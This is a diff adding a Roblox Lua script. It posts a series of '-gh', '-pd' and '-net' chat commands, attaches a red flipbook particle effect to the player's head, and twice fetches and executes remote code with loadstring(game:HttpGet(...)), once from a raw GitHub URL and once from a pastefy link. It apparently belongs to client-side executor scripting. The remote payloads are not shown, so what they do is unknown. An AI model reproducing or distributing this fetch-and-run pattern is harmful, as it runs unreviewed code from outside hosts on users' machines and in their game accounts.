@@ -1,0 +1,97 @@
+--Get the TextChatService
+local TextChatService = game:GetService("TextChatService")
+
+-- Function to send a chat message
+local function sendChatMessage(message)
+    -- Check if TextChatService is available
+    if TextChatService then
+        -- Send the message to the default chat channel
+        local chatChannel = TextChatService.TextChannels.RBXGeneral
+        if chatChannel then
+            chatChannel:SendAsync(message)
+        else
+            warn("Default chat channel (RBXGeneral) not found!")
+        end
+    else
+        warn("TextChatService is not available!")
+    end
+end
+
+sendChatMessage("-gh 106895658225908 110417854751822 18999927321 133494382216113 75253928472062 92446832636929 85553268095223")
+wait(5)
+sendChatMessage("-gh 18974150883 18974146513 18974150883 18974146513123299565162837 129869875355653")
+wait(5)
+sendChatMessage("-gh 123299565162837 79978519124159 17650507297012 129869875355653")
+wait(5)
+sendChatMessage("-gh 106771820614777 84552051930287 106301974718164 125895225186271")
+wait(5)
+sendChatMessage("-gh 92244212710872")
+wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/barbosaatestbarbosaa-hash/Sounda/refs/heads/main/Cube%204"))()
+wait(5)
+sendChatMessage("-pd")
+sendChatMessage("-net")
+
+task.spawn(function()
+
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local head = char:WaitForChild("Head")
+
+    -- Attachment eye
+    local eye = head:FindFirstChild("eye")
+    if not eye then
+        eye = Instance.new("Attachment")
+        eye.Name = "eye"
+        eye.Position = Vector3.new(0.2, 0.15, -0.4)   -- posição que você pediu
+        eye.Parent = head
+    end
+
+    -- Particle Emitter
+    local p = eye:FindFirstChild("EyeParticle") or Instance.new("ParticleEmitter")
+    p.Name = "EyeParticle"
+    p.Parent = eye
+
+    p.Enabled = true
+    p.Texture = "rbxassetid://91738358357977"
+    p.Rate = 20
+
+    p.Lifetime = NumberRange.new(0.5, 0.5)
+    p.Speed = NumberRange.new(1.5, 1.5)
+    p.SpreadAngle = Vector2.new(0, 0)
+
+    p.Rotation = NumberRange.new(-90, -90)
+    p.RotSpeed = NumberRange.new(0, 0)
+
+    p.Size = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 0),
+        NumberSequenceKeypoint.new(0.5, 0.875),
+        NumberSequenceKeypoint.new(1, 0)
+    })
+
+    p.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 0),
+        NumberSequenceKeypoint.new(1, 1)
+    })
+
+    p.Color = ColorSequence.new(Color3.new(1, 0.04855, 0.12312))
+
+    p.LightEmission = 0
+    p.Brightness = 10
+    p.ZOffset = 0.5
+    p.Drag = 0
+    p.Acceleration = Vector3.new(0, 0, 6.5)
+
+    p.EmissionDirection = Enum.NormalId.Right
+    p.LockedToPart = true
+    p.Orientation = Enum.ParticleOrientation.VelocityParallel
+
+    -- Flipbook
+    p.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
+    p.FlipbookMode = Enum.ParticleFlipbookMode.Loop
+    p.FlipbookFramerate = NumberRange.new(22.5, 22.5)
+    p.FlipbookStartRandom = true
+
+end)
+
+loadstring(game:HttpGet("https://pastefy.app/5Vq2C3Te/raw"))()
